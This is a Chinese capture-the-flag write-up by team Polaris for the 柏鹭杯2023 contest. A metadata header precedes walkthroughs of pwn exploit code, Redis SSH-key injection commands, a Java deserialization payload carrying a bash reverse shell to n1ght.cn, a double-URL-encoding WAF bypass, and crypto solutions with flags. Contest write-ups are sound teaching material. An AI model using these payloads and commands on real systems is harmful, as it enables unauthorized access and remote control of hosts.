---
title: 柏鹭杯2023 WP -Polaris战队
contest: 柏鹭杯2023
year: 2023
difficulty: medium
vuln_type: pwn_unknown
tags: [PWN eval/heap, Java反序列化, Redis SSH公钥注入, Express.js, file协议, RSA连分数, 维吉尼亚密码]
attack_chain: PWN eval:one_gadget链调用→PWN heap:tcache+_IO_FILE结构+setcontext→Web综合7:读application.properties泄露redis端口+密码→写SSH公钥+config set dir+save→SSH免密登录→综合题6:Java反序列化+Runtime.exec反弹shell+suid dig提权→express js:file协议href/origin/protocol+双层URL编码flag.txt→综合5:XOR解密enc_flag1→Crypto rsa:连分数+leak=pow(p-q, num1, n)→d=invert(e)→p-q→p*q=n解p,q
key_payload: "eval:libc+0x52290+0x54310+0x1b45bd+0x23b6a;heap:guard+heap_addr+image_addr 0xEAD;redis-cli -x set xqq;config set dir /root/.ssh;config set dbfilename authorized_keys;continued_fraction(num3) convergents;pow(p-q, num1, num1*num2)"
one_liner: 柏鹭杯2023 Polaris战队综合WP：PWN+Redis SSH公钥+Java反序列化+Express file协议+RSA连分数+维吉尼亚
lesson: Redis写authorized_keys免密登录+连分数求RSA p/q+Java反序列化Runtime反弹shell
quality: high
---

# 柏鹭杯2023 WP -Polaris战队

**赛事**：柏鹭杯2023（Polaris战队第7名）

**多方向WP**：

**1. PWN-eval（one_gadget链）**
```python
sh.sendline(b'+52')  # leak libc
libc_addr = int(sh.recvline()) - 0x24083
sh.sendline(f'+54-{libc_addr + 0x52290}')  # one_gadget 0x52290
sh.sendline(f'+53-{libc_addr + 0x0000000000054310}')
sh.sendline(f'+52-{libc_addr + 0x1b45bd}')
sh.sendline(f'+51-{libc_addr + 0x0000000000023b6a}')
```

**2. PWN-heap（tcache + _IO_FILE + setcontext）**
- 4次add(0x20) + delete(1) 触发off-by-null
- 泄露guard + heap_addr + libc_addr
- _IO_FILE结构体伪造（0xfbad3887）
- image_addr = u64 - 0x609
- edit(5, p64(image_addr + 0xEAD)) 改setcontext地址

**3. Web-综合7（Redis SSH公钥注入）**
- 读 `../../../../usr/local/share/application.properties` 泄露redis端口+密码
- `redis-cli -h 172.25.0.10 -p 62341 -a de17cb1cfa1a8e8011f027b416775c6a -x set xqq < key.txt`
- `config set dir /root/.ssh; config set dbfilename authorized_keys; save`
- `ssh -i id_rsa root@172.25.0.10` 免密登录

**4. Web-综合6（Java反序列化）**
- Ping类setCommand("/bin/bash") + setArg1("-c") + setArg2("bash -i >& /dev/tcp/n1ght.cn/5555 0>&1")
- ObjectOutputStream.writeObject → Base64编码 → 触发反序列化
- suid提权：dig读文件

**5. express js（file协议+双层URL编码）**
- 直接读main.js → flag被waf
- poc: `?file[href]=aa&file[origin]=aa&file[protocol]=file:&file[hostname]=&file[pathname]=%2566lag.txt`
- pathname双层URL编码 `%2566` = `%66` = `f` → 绕waf读flag.txt

**6. 综合5（XOR解密）**
- `enc_flag1 = "UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA=="`
- `O0O = "6925cc02789c1d2552b71acc4a2d48fd"`
- XOR循环：`chr(ord(c) ^ ord(key[i%len]))`

**7. Crypto-RSA（连分数 + 逆推p-q）**
- `num3 = 1.233899234150033739005675154714361688...`
- `c = continued_fraction(num3)`
- 遍历convergents，筛选512bit的素数p、q
- `leak = pow(p-q, num1, num1*num2)` → `d = inverse_mod(num1, (num1-1)*(num2-1))`
- `p_q = pow(leak, d, num1*num2)`
- 联立 `p-q=p_q` 和 `p*q=n` → sympy解p, q
- flag: `flag{ISEC-WeMu5tKe2pOn_70in5And#N3Ver@G1veUp!}`

**8. 密码2（维吉尼亚换表）**
- 压缩包密码 `i~BgtN_Ld@sw6c9`（ARCHPR爆破）
- 密文密码 `ROT47`（ROT47解码）
- 自定义表 `b"abcd07efghij89klmnopqr16stuvwxyz-_{}ABCDEFGHIJKL34MNOPQRST25VWXYZ"`
- `_l(idx, s) = s[idx:] + s[:idx]` 循环移位
- 维吉尼亚加密：k1和k2是同一key的相反

**质量评估**：高（8题payload + flag）
